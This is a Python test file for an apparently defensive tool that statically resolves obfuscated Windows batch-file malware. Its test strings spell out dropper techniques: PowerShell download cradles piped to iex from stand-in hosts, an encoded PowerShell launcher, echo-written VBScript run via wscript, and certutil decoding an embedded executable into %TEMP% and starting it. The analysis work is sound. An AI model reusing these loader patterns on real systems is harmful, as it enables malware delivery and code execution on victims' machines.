"""Improve languages, phase 3 (batch): a .bat walked the way cmd.exe reads it (never run): %var% /
!var! / substrings, blocks, if / for / goto / call, files written with echo / certutil / copy / more,
the commands it chains (PowerShell, a .vbs it wrote, mshta, certutil, bitsadmin) and what depends on
the victim's machine.
"""

from __future__ import annotations

import base64
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from test_js_techniques import _analyze, _ms, client  # noqa: E402,F401

from docutracex.resolve import bat_eval  # noqa: E402

PE = b"MZ" + b"\x90\x00" * 30 + b" inert DocuTraceX stub " * 4


def test_dosfuscation_and_enc() -> None:
    s = bat_eval.resolve(_ms().dosfuscation_bat().decode())
    assert s.stages[0].data == 'i""w""r http://invoice-files.example/Factura_2024-0613.ps1 | iex'
    s = bat_eval.resolve(_ms().dropper_bat().decode() if hasattr(_ms(), "dropper_bat") else
                         "set a=power\r\nset b=shell\r\n%a%%b% -nop -enc " + base64.b64encode("Write-Host b".encode("utf-16-le")).decode())
    assert any(st.ext == ".ps1" for st in s.stages)


def test_echo_vbs_run_and_certutil_self() -> None:
    b64 = base64.b64encode(PE).decode()
    s = bat_eval.resolve('@echo off\r\nset f=%TEMP%\\f.vbs\r\necho Set sh = CreateObject("WScript.Shell") > %f%\r\n'
                         'echo sh.Run "calc" >> %f%\r\nwscript //B %f%\r\n'
                         'certutil -f -decode "%~f0" "%TEMP%\\x.exe" >nul\r\nstart "" "%TEMP%\\x.exe"\r\nexit /b\r\n'
                         f'-----BEGIN CERTIFICATE-----\r\n{b64}\r\n-----END CERTIFICATE-----\r\n')
    vbs = next(st for st in s.stages if st.target.endswith("f.vbs"))
    assert vbs.data.startswith(b"Set sh") and "and runs (wscript //B %TEMP%\\f.vbs)" in vbs.sink
    exe = next(st for st in s.stages if st.target.endswith("x.exe"))
    assert exe.data == PE and exe.recipe[:2] == ("the script's own file", "base64 (certutil -decode)")
    assert {d.get("ext") for d in s.decoded_stages() if "text" in d} == {".vbs"}


def test_pipe_more_loops_and_unresolved() -> None:
    s = bat_eval.resolve('set u=https://billing-portal.example/p.ps1\r\necho IEX (iwr %u%) | powershell -nop -\r\n')
    assert s.stages[0].data == "IEX (iwr https://billing-portal.example/p.ps1)" and s.stages[0].ext == ".ps1"
    s = bat_eval.resolve('@echo off\r\nmore +4 "%~f0" > %TEMP%\\p.ps1\r\npowershell -f %TEMP%\\p.ps1\r\nexit /b\r\nWrite-Host "the tail"\r\n')
    assert s.stages[0].data.startswith(b'Write-Host "the tail"') and s.stages[0].recipe[:2] == ("the script's own file", "more +4")
    s = bat_eval.resolve('@echo off\r\nset i=0\r\n:loop\r\nset /a i+=1\r\nif %i% LSS 3 (\r\n  goto loop\r\n) else (\r\n'
                         '  echo powershell -c "Write-Host loop %i% and some more text" > %TEMP%\\l.bat\r\n)\r\n')
    assert s.stages[0].data.startswith(b'powershell -c "Write-Host loop 3')
    s = bat_eval.resolve("for /f \"tokens=3\" %%a in ('reg query \"HKCU\\Software\\Fx\" /v c') do set c=%%a\r\n%c% /c x\r\n")
    assert "reg query" in s.unresolved[0]["depends_on"]


def test_bat_loader_sample_end_to_end(client) -> None:  # noqa: ANN001,F811
    _cid, res = _analyze(client, "sample_bat_loader.bat", _ms().bat_loader())
    bat = json.loads((res / "batch.json").read_text())
    r = bat["scripts"][0]["resolution"]
    kinds = {(s["kind"], s["type"]) for s in r["stages"]}
    assert ("write", "pe") in kinds and ("exec", "text") in kinds
    assert any(s.get("target", "").endswith("fx.vbs") for s in r["stages"])
    assert r["downloads"][0]["url"] == "https://billing-portal.example/inv/bat-cfg.dat"
    assert "Factura0187" in r["unresolved"][0]["depends_on"]
    rules = {f["rule"] for f in bat["findings"]}
    assert {"bat_resolved_stages", "batch_resolved_download", "batch_unresolved_dynamic_call"} <= rules
    tree = json.loads((res / "nested.json").read_text())["tree"]
    names = [n["filename"] for n in tree]
    assert any(n.endswith(".vbs") for n in names) and any(n.get("format") == "PE" for n in tree)
    vbs = next(n for n in tree if n["filename"].endswith(".vbs"))
    assert "bat-vbs.ps1" in json.dumps(vbs.get("findings") or []) + json.dumps(vbs.get("children") or [])
